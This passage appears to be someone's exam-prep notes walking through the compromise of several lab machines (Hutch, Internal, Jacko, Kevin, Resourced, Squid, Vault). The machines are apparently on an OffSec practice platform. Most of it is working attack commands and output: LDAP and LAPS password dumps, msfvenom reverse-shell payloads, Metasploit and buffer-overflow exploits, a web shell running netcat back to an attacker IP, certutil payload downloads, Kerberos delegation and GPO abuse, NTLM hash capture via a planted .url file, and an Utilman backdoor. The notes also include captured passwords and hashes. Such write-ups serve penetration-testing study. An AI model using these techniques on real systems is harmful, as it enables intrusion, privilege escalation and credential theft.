49676/tcp open  unknown          syn-ack
49692/tcp open  unknown          syn-ack
49815/tcp open  unknown          syn-ack
```

2. Ldap port open so, started working on it. Dump user passwords. 
```
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.245.122" "(objectclass=*)"

description: Password set to CrabSharkJellyfish192 at user's request. Please c

sAMAccountName: fmcsorley
```

3. Dump admin password. 
```
ldapsearch -x -H 'ldap://192.168.245.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 

ms-Mcs-AdmPwd: 8!.@hJ$3K/9Y26
```

4. Impacket login. Obtained local.txt and root.txt
```
impacket-psexec hutch.offsec/administrator:'8!.@hJ$3K/9Y26'@192.168.245.122

C:\Users\fmcsorley\Desktop> type local.txt
e421093202bde328492627830ef15f90

C:\Users\Administrator\Desktop> type proof.txt
486de9e68f17ec8a3a393103d2ff3c4e
```

Videos commands 
```
1. rpcclient -U "" -N $ip, enumdomusers (anonymous)
2. ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=hutch,DC=offsec" (anonymous)
3. crackmapexec ldap $ip -u '' -p '' -M get-desc-users
4. cadaver $ip (presence of webdav)
5. upload cmd.apsx, get reverse shell
6. use seimpersonate  as priv esc. 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.202 LPORT=4433 -f exe -o r.exe 
.\SweetPotato.exe -e EfsRpc -p r.exe
```

## Internal
1. Rustscan
```
PORT      STATE SERVICE       REASON
53/tcp    open  domain        syn-ack
135/tcp   open  msrpc         syn-ack
139/tcp   open  netbios-ssn   syn-ack
445/tcp   open  microsoft-ds  syn-ack
3389/tcp  open  ms-wbt-server syn-ack
5357/tcp  open  wsdapi        syn-ack
49152/tcp open  unknown       syn-ack
49153/tcp open  unknown       syn-ack
49154/tcp open  unknown       syn-ack
49155/tcp open  unknown       syn-ack
49156/tcp open  unknown       syn-ack
49157/tcp open  unknown       syn-ack
49158/tcp open  unknown       syn-ack
```

2. Nmap 
```
nmap -p$(cat internal-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.185.40
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 01:13 EDT
Nmap scan report for 192.168.185.40
Host is up (0.32s latency).

PORT      STATE SERVICE            VERSION
53/tcp    open  domain             Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2024-03-16T05:14:51+00:00
|_ssl-date: 2024-03-16T05:15:00+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=internal
| Not valid before: 2023-01-22T17:37:15
|_Not valid after:  2023-07-24T17:37:15
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s
|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:bf:1e:50 (VMware)
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-03-15T22:14:51-07:00
| smb2-time: 
|   date: 2024-03-16T05:14:50
|_  start_date: 2023-01-23T17:37:08
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.15 seconds
```

3. Smb vulnerability search
```
nmap -Pn -p445 --script vuln 192.168.185.40 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 01:21 EDT
Nmap scan report for 192.168.185.40
Host is up (0.31s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in s in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) charn a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted derefof an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-310
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 92.48 seconds
```

4. Exploit with metasploit and obtain proof.txt
```
search 3103

msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > show options
Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):
   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.185.40   yes       The target host(s), see https://docs.metaspl
                                      oit.com/docs/using-metasploit/basics/using-m
                                      etasploit.html
   RPORT   445              yes       The target port (TCP)
   WAIT    180              yes       The number of seconds to wait for the attack
                                       to complete.
Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread,
                                         process, none)
   LHOST     192.168.45.174   yes       The listen address (an interface may be sp
                                        ecified)
   LPORT     4433             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)
View the full module info with the info, or info -d command.
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > run

meterpreter > shell
Process 3224 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
6dc647282733573bae7d29e3119dea86
```


## Jacko
1. Nmap and Rustscan
```
PORT      STATE SERVICE         REASON
80/tcp    open  http            syn-ack
135/tcp   open  msrpc           syn-ack
139/tcp   open  netbios-ssn     syn-ack
445/tcp   open  microsoft-ds    syn-ack
5040/tcp  open  unknown         syn-ack
7680/tcp  open  pando-pub       syn-ack
8082/tcp  open  blackice-alerts syn-ack
9092/tcp  open  XmlIpcRegSvc    syn-ack
49664/tcp open  unknown         syn-ack
49665/tcp open  unknown         syn-ack
49666/tcp open  unknown         syn-ack
49667/tcp open  unknown         syn-ack
49668/tcp open  unknown         syn-ack
49669/tcp open  unknown         syn-ack

PORT      STATE  SERVICE       VERSION
80/tcp    open   http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: H2 Database Engine (redirect)
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds?
5040/tcp  open   unknown
7680/tcp  closed pando-pub
8082/tcp  open   http          H2 database http console
|_http-title: H2 Console
9092/tcp  open   XmlIpcRegSvc?
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49668/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
```

2. Found a page at 8082 which has exploit. 
```
http://192.168.223.66:8082/login.jsp?jsessionid=4643e845bbc10a2515a7cd02b0d3dc13

https://www.exploit-db.com/exploits/49384?source=post_page-----5233e3d6f5e--------------------------------

Run all script line one by one and run it. Obtained foothold after uploading msfvenom reverse.exe file in temp folder and running it. 
```

3. Foothold
```
nc -lvnp 4445
listening on [any] 4445 ...
connect to [192.168.45.153] from (UNKNOWN) [192.168.223.66] 49739
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\H2\service>
```

4. Make it more interactive command
```
C:\Program Files (x86)>set PATH=%SystemRoot%\system32;%SystemRoot%;
```

5. Upload msfvenom dll file and also exploit. 
```
certutil -urlcache -f http://192.168.45.202/exploit.dll C:/Windows/Temp/UninOldIS.dll

https://www.exploit-db.com/exploits/49382
```

6. Obtained another reverse shell as root. 
```
C:\Windows\Temp>C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ep bypass C:\Windows\Temp\49382.ps1
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ep bypass C:\Windows\Temp\49382.ps1
Writable location found, copying payload to C:\JavaTemp\
Payload copied, triggering...

sudo nc -nvlp 2222                         
listening on [any] 2222 ...
connect to [192.168.45.153] from (UNKNOWN) [192.168.223.66] 49785
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```


## Kevin
1. Rustscan
```
PORT      STATE SERVICE       REASON
80/tcp    open  http          syn-ack
135/tcp   open  msrpc         syn-ack
139/tcp   open  netbios-ssn   syn-ack
445/tcp   open  microsoft-ds  syn-ack
3389/tcp  open  ms-wbt-server syn-ack
3573/tcp  open  tag-ups-1     syn-ack
49152/tcp open  unknown       syn-ack
49153/tcp open  unknown       syn-ack
49154/tcp open  unknown       syn-ack
49155/tcp open  unknown       syn-ack
49159/tcp open  unknown       syn-ack
49160/tcp open  unknown       syn-ack
```

2. Nmap
```
nmap -p$(cat kevin-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.185.45
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 03:12 EDT
Nmap scan report for 192.168.185.45
Host is up (0.31s latency).

PORT      STATE SERVICE            VERSION
80/tcp    open  http               GoAhead WebServer
|_http-server-header: GoAhead-Webs
| http-title: HP Power Manager
|_Requested resource was http://192.168.185.45/index.asp
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2024-03-16T07:14:06+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=kevin
| Not valid before: 2024-03-15T07:10:06
|_Not valid after:  2024-09-14T07:10:06
| rdp-ntlm-info: 
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2024-03-16T07:13:55+00:00
3573/tcp  open  tag-ups-1?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:bf:2d:65 (VMware)
| smb-os-discovery: 
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-03-16T00:13:54-07:00
| smb2-time: 
|   date: 2024-03-16T07:13:54
|_  start_date: 2024-03-16T07:10:54
|_clock-skew: mean: 1h24m01s, deviation: 3h07m50s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.08 seconds
```

3. Find the admin:admin credentials valid, logged in and found hp power manager 4.2 version. Find exploit for that. 
```
https://github.com/manuelz120/CVE-2022-23940
```

4. Change exploit shell code. Generate reverse shell code. Replace in exploit. 
```
 msfvenom -p windows/shell_reverse_tcp -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.45.174 LPORT=80 -e x86/alpha_mixed -f c 
```

5. Run exploit and obtained reverse shell
```
python2 10099.py 192.168.223.45
HP Power Manager Administration Universal Buffer Overflow Exploit
ryujin __A-T__ offensive-security.com
[+] Sending evil buffer...
HTTP/1.0 200 OK

[+] Done!
[*] Check your shell at 192.168.223.45:4444 , can take up to 1 min to spawn your shell

sudo nc -nvlp 80           
listening on [any] 80 ...
connect to [192.168.45.174] from (UNKNOWN) [192.168.223.45] 49168
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

6. Found Root.txt
```
C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
e66bdd81463b7c3c11551b66d205c102
```

## Kyoto
1. It has a deep buffer overflow activities, not within scope of oscp


## Nara
1. It is a OSEP level box


## Resourced
1. Rustscan and Nmap
```
53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49666,49667,49674,49675,49693,49712 192.168.187

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-11 00:24:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2024-03-21T10:42:07
|_Not valid after:  2024-09-20T10:42:07
|_ssl-date: 2024-04-11T00:25:56+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2024-04-11T00:25:16+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-04-11T00:25:17
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

2. Enum4linux
```
enum4linux -a -u '' -p '' 192.168.187.175

index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)       Desc: New-hired, reminder: HotelCalifornia194!
```

3. Download SYSTEM and ndts.dit
```
smbclient \\\\192.168.187.175\\'Password Audit' -U 'V.Ventz'

impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL 
```

4. Figure out the right user and hashes for winrm
```
crackmapexec winrm 192.168.187.175 -u user -H hashes -d resourced.local 

WINRM       192.168.187.175 5985   192.168.187.175  [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
```

5. Obtained local.txt from winrm. 
```
evil-winrm  -i 192.168.187.175 -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f808'
```

6. Remaining (User livingstone have genericall permission on domain controller)
```
impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.120.181 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'


*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> get-adcomputer attack


sudo python3 rbcd.py -dc-ip 192.168.120.181 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone    


*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity


impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.120.181


export KRB5CCNAME=./Administrator.ccache


sudo sh -c 'echo "192.168.120.181 resourcedc.resourced.local" >> /etc/hosts'


sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.120.181 
```

## Squid
1. Rustscan
```
Open 192.168.223.189:135
Open 192.168.223.189:139
Open 192.168.223.189:445
Open 192.168.223.189:3128
Open 192.168.223.189:49667
Open 192.168.223.189:49666
```

2. Nmap
```
nmap -A -T4 -p135,139,445,3128,49667,49666 192.168.223.189 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 05:39 EDT
Nmap scan report for 192.168.223.189
Host is up (0.31s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3128/tcp  open  http-proxy    Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.14
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-03-16T09:40:36
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.01 seconds
```

3. Found webpage at 3128 port. Found exploit for it's version 4.14 squid. Run exploit. 
```
https://github.com/aancw/spose

python3 spose.py --proxy http://192.168.223.189:3128 --target 192.168.223.189
Using proxy address http://192.168.223.189:3128
192.168.223.189 3306 seems OPEN 
192.168.223.189 8080 seems OPEN 
```

4. Create proxy for 8080 open port. After that, 8080 will be accessible
```
IN foxyproxy, 
Type - HTTP
Hostname - IP of machine
Port - 3128
```

5. Can access 'phpmyadmin' in port 8080 with 'root:null' creds. 

6. Upload php reverse shell command 
![[Pasted image 20240316195214.png]]

7. Obtained reverse shell. Found local.txt
```
http://192.168.223.189:8080/shell.php?c=nc64.exe%20192.168.45.174%204545%20-e%20cmd.exe

nc -nvlp 4545
listening on [any] 4545 ...
connect to [192.168.45.174] from (UNKNOWN) [192.168.223.189] 49770
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\wamp\www>

type local.txt
4a692435f90bdb5be6f735be156fcb56
```

8. Use of Fullpower.exe to enable all the privileges. 
```
https://github.com/itm4n/FullPowers/releases

C:\wamp\www>FullPowers.exe
FullPowers.exe
[+] Started dummy thread with id 1524
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.
```

9. Use printspoofer64.exe for privileges escalation. Obtained root.txt
```
PS C:\wamp\www> .\PrintSpoofer64.exe -i -c powershell.exe
.\PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system

PS C:\Users\Administrator\Desktop> type proof.txt
type proof.txt
d3f9bc6bbc47f05aa316f425e9cc57a9
```


## Vault

1. Rustscan and Nmap 
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-12 03:20:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2024-04-12T03:20:59+00:00
| ssl-cert: Subject: commonName=DC.vault.offsec
| Not valid before: 2024-03-22T12:00:33
|_Not valid after:  2024-09-21T12:00:33
|_ssl-date: 2024-04-12T03:21:39+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49813/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-04-12T03:21:00
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

2. Check out smbclient, upload a file with that give hashes with responder. 
```
smbclient -N -L 192.168.120.116
smbclient -N //192.168.120.116/DocumentsShare

cat @hax.url 
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\192.168.118.14\%USERNAME%.icon
IconIndex=1

smb: \> put @hax.url 

sudo responder -I tap0 -v

anirudh::VAULT:9def1316e1c05550:0AF01C475AFD7AD30D439711296603FC:010100000000000000C8C8F445DDD70175319E0B50E5D26C0000000002000800410031005900380001001E00570049004E002D004C00580033003800430030004B004C00350047005A0004003400570049004E002D004C00580033003800430030004B004C00350047005A002E0041003100590038002E004C004F00430041004C000300140041003100590038002E004C004F00430041004C000500140041003100590038002E004C004F00430041004C000700080000C8C8F445DDD7010600040002000000080030003000000000000000010000000020000024B3687DE76994B1C5B750504A62A0055473E634299355A166AE72D58CD7F8660A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E003100310038002E00310034000000000000000000:SecureHM  
```

3. Evil winrm login and upload powerview.ps1. Run it. 
```
 evil-winrm -i 192.168.187.172 -u anirudh -p "SecureHM" 
*Evil-WinRM* PS C:\Users\anirudh\Documents> dir
    Directory: C:\Users\anirudh\Documents
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/11/2024   8:27 PM         770273 PowerView.ps1
```

4. List GPO and get ID. 
```
*Evil-WinRM* PS C:\Users\anirudh\Documents> Get-GPO -Name "Default Domain Policy
DisplayName      : Default Domain Policy
DomainName       : vault.offsec
Owner            : VAULT\Domain Admins
Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 11/19/2021 12:50:33 AM
ModificationTime : 11/19/2021 2:00:32 AM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 4, SysVol Version: 4
WmiFilter        :
```

5. Figure out GPO ID permissions 
```
*Evil-WinRM* PS C:\Users\anirudh\Documents> Get-GPPermission -Guid 31B2F340-016D-00C04FB984F9 -TargetType User -TargetName anirudh
Trustee     : anirudh
TrusteeType : User
Permission  : GpoEditDeleteModifySecurity
Inherited   : False
```

6. GPO Abuse via SharpGPOAbuse
```
wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe

*Evil-WinRM* PS C:\Users\anirudh\Documents> ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"

gpupdate /force

net localgroup Administrators
```

7. Impacket login and obtained proof. 
```
python3 /usr/share/doc/python3-impacket/examples/psexec.py vault.offsec/anirudh:SecureHM@192.168.120.116

C:\Windows\system32> whoami
nt authority\system
```

8. Another priv. 
```
ren Utilman.exe Utilman.old
ren cmd.exe Utilman.exe
```